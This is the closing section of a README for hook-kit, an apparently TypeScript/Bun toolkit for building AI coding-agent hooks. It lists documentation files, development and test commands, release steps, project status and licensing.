- [**docs/ADAPTERS.md**](docs/ADAPTERS.md) — `ProtocolAdapter` contract; how to author a new adapter (Cursor / Cline / MCP / custom).
- [**docs/ESCALATION.md**](docs/ESCALATION.md) — askpass envelope schema + broker filesystem-spool protocol + listener-authoring guide.
- [**docs/STATE.md**](docs/STATE.md) — `StateStore` contract (the four guarantees), read-modify-write pattern, per-store comparison. Backs the cross-invocation state recipe above.
- [**docs/STABILITY.md**](docs/STABILITY.md) — three-tier stability system + deprecation cycle.
- [**examples/ai-guardrails/README.md**](examples/ai-guardrails/README.md) — reference plugin walkthrough.
- [**examples/adapter-template/README.md**](examples/adapter-template/README.md) — fork-and-modify scaffold for a custom adapter.
- [**CLAUDE.md**](CLAUDE.md) — Claude Code orientation for this repo.

---

## Development

Prerequisites: Bun ≥ 1.2 (used as runtime, test runner, and binary compiler), TypeScript 6.

```bash
git clone https://github.com/Questi0nM4rk/hook-kit
cd hook-kit
bun install
bun run test            # full suite (see the test count in Quality bar)
bun run typecheck       # tsc --noEmit
bun run lint            # biome + eslint
bun run build           # emit dist/types
bun run build:bin       # compile the hook-kit CLI binary itself
```

The npm `test` script runs three separate `bun test` processes (under a coverage-floor wrapper):

```bash
bun scripts/check-coverage.ts && bun test tests-isolated/ && bun test examples/adapter-template/tests/
```

(`check-coverage.ts` internally runs `bun test tests/ --coverage` — the regular suite.)

- `tests/` — the regular suite.
- `tests-isolated/` — tests that need `mock.module()` for module-level mocks. Bun's `mock.module()` is process-sticky across files ([oven-sh/bun#14516](https://github.com/oven-sh/bun/issues/14516)) and would poison sibling tests in the regular suite. The split keeps each isolated test file its own `bun test` process. **Don't add `mock.module()` to anything under `tests/` — put it under `tests-isolated/` instead.**
- `examples/adapter-template/tests/` — the adapter-template's own in-process unit tests, run in their own process for the same isolation reason.

### Releasing

Releases are cut manually. To ship a new version:

```bash
bun run build && bun test     # full gate (mirrors prepublishOnly)
npm version patch             # or minor / major; bumps package.json + tag
npm publish --access public
git push --follow-tags
```

---

## Status

Pre-release (`0.x`) — see the [npm badge](https://www.npmjs.com/package/@questi0nm4rk/hook-kit) above for the current published version. The shell-wrapper API + output convention is intended to stabilize toward `1.0`; stability tiers per export are tracked in [`docs/STABILITY.md`](docs/STABILITY.md). Adapter-bin shape (CC, future Cursor / OpenCode / KiloCode) and broker spool layout are stable across `0.x`.

Per-version highlights live in the [`CHANGELOG.md`](CHANGELOG.md). Published to npm as [`@questi0nm4rk/hook-kit`](https://www.npmjs.com/package/@questi0nm4rk/hook-kit).

---

## License

MIT — see [LICENSE](LICENSE). Built on [`@questi0nm4rk/shell-ast`](https://github.com/Questi0nM4rk/shell-ast) (MIT), which wraps [`mvdan/sh`](https://github.com/mvdan/sh) (BSD-3).
